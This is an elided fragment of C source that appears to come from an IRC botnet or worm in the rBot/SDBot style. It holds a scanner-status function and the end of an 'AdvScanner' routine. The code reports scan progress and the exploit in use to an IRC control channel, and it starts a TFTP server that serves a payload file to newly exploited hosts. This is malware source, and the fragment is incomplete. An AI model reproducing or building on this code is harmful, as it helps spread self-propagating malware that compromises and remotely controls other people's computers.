...
void currentIP(SOCKET sock, char *chan, BOOL notice, int threadnum)
{
	...
	if (findthreadid(SCAN_THREAD) > 0) {
		...
		sprintf(sendbuf, "Current IP: %s.",finet_ntoa(in));
	} else 
		sprintf(sendbuf ,"Scan not active.");
	 ...
	 if(scan.exploit != -1) {
		if (exploit[scan.exploit].tftp) {
			if (findthreadid(TFTP_THREAD) == 0) {
				...
				sprintf(sendbuf, "Server started on IP: %s:%d, File: %s, Request: %s.",GetIP(tftpd.sock), tftpd.port, tftpd.filename, tftpd.requestname);
...
DWORD WINAPI AdvScanner(LPVOID param)
{
	...
	sprintf(buffer,"Finished at %s:%d after %d minute(s) of scanning.", finet_ntoa(in), scan.port, scan.minutes);
	if (!scan.silent) irc_privmsg(scan.sock,scan.chan,buffer,scan.notice);
	addlog(buffer);
